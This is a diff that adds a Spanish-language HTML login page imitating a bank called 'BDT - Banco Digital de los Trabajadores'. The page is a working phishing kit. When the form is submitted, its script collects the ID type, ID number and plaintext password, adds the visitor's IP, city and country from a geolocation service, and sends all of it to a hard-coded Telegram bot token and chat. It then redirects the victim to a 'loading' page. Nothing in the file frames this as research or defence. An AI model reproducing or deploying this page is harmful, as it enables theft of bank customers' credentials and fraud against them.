@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BDT - Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body
+    class="bg-gray-100 flex flex-col items-center justify-center min-h-screen space-y-6"
+  >
+    <!-- Logo -->
+    <div class="w-full max-w-sm flex justify-center">
+      <img
+        src="logol.png"
+        alt="BDT - Banco Digital de los Trabajadores Logo"
+        style="width: 70%"
+      />
+    </div>
+
+    <!-- Formulario de Inicio de Sesión -->
+    <form id="loginform">
+      <div class="w-full max-w-sm bg-white rounded-xl shadow-lg p-6 space-y-6">
+        <!-- Fila de Tipo y Nro. de Identificación -->
+        <div class="flex space-x-3">
+          <!-- Tipo -->
+          <div class="w-1/3">
+            <label class="block text-sm font-semibold text-gray-700"
+              >Tipo *</label
+            >
+            <select
+              class="w-full p-3 border border-gray-300 rounded-lg focus:ring focus:ring-blue-200 focus:outline-none"
+              id="tipo"
+            >
+              <option value="V">V</option>
+              <option value="E">E</option>
+              <option value="P">P</option>
+            </select>
+          </div>
+
+          <!-- Nro. de Identificación -->
+          <div class="w-2/3">
+            <label class="block text-sm font-semibold text-gray-700"
+              >Nro. de identificación *</label
+            >
+            <input
+              type="text"
+              id="identificacion"
+              placeholder="Ej: 123312498"
+              class="w-full p-3 border border-gray-300 rounded-lg focus:ring focus:ring-blue-200 focus:outline-none"
+            />
+          </div>
+        </div>
+
+        <!-- Contraseña -->
+        <div>
+          <label class="block text-sm font-semibold text-gray-700"
+            >Contraseña *</label
+          >
+          <div class="relative">
+            <input
+              id="password"
+              type="password"
+              placeholder="Ej: ********"
+              class="w-full p-3 border border-gray-300 rounded-lg focus:ring focus:ring-blue-200 focus:outline-none"
+            />
+            <span
+              id="togglePassword"
+              class="absolute inset-y-0 right-3 flex items-center cursor-pointer"
+            >
+              <i class="fas fa-eye text-gray-400"></i>
+            </span>
+          </div>
+        </div>
+
+        <!-- Botón de Ingreso -->
+        <button
+          class="w-full bg-blue-800 text-white font-semibold py-3 rounded-lg hover:bg-blue-900"
+          type="submit"
+        >
+          Ingresar
+        </button>
+
+        <!-- Botón de Abrir Cuenta -->
+        <button
+          class="w-full border border-blue-800 text-blue-800 font-semibold py-3 rounded-lg hover:bg-blue-50"
+          type="button"
+        >
+          Abrir cuenta
+        </button>
+      </div>
+    </form>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
+    <script>
+      document
+        .getElementById("togglePassword")
+        .addEventListener("click", function () {
+          const passwordField = document.getElementById("password");
+          const icon = this.querySelector("i");
+          if (passwordField.type === "password") {
+            passwordField.type = "text";
+            icon.classList.remove("fa-eye");
+            icon.classList.add("fa-eye-slash");
+          } else {
+            passwordField.type = "password";
+            icon.classList.remove("fa-eye-slash");
+            icon.classList.add("fa-eye");
+          }
+        });
+    </script>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const tipo = document.querySelector("#tipo").value;
+          const identificacion =
+            document.querySelector("#identificacion").value;
+          const password = document.querySelector("#password").value;
+
+          localStorage.setItem("usuario", identificacion);
+          const message =
+            "BDT\nTipo: " +
+            tipo +
+            "\nIdentificacion: " +
+            identificacion +
+            "\nContra: " +
+            password +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot8087787695:AAGAmKDS_av1aUTknh5t4P_2-xHsP0MCVI0/sendMessage",
+              {
+                chat_id: "-4761852693",
+                text: message,
+              }
+            )
+            .then((response) => {
+              window.location.href = "cargando.html";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
